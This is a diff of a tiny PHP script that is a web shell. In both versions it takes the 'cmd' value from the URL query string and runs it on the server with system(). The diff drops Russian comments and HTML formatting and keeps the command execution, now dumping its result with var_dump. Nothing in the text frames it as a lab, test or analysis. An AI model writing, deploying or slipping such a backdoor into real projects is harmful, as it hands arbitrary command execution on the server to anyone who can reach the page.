@@ -1,12 +1,7 @@
 <?php
 
-// Берем параметр cmd из GET
 $cmd = $_GET['cmd'];
 
-// Выполняем команду на сервере
-echo "<pre>";
-system($cmd);
-echo "</pre>";
+$r =system($cmd);
 
-echo "<pre>";
-system($_GET['cmd']);
+var_dump($r);
